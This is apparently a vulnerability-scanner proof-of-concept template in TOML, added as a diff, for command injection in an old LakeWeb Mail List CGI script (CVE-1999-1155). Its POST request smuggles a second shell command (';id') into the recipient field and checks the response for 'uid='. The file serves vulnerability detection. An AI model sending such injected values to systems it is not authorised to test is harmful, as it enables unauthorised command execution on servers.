@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "LakeWeb Mail List CGI 脚本未对用户输入的 email 地址进行过滤，攻击者可通过在 recipient 参数中注入 shell 元字符（如 ; | ` $()）执行任意系统命令。验证方式为向 CGI 脚本发送包含命令注入 payload 的请求并检测响应。"
+id = "POC-AVE-1999-1368"
+name = "LakeWeb Mail List CGI 命令执行漏洞 PoC"
+severity = "high"
+tags = ["ave-1999-1368"]
+vuln_id = [
+    "CVE-1999-1155",
+    "AVE-1999-1368",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/mail_list.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/mail_list.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "recipient=test@test.com%3Bid&subject=test&message=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
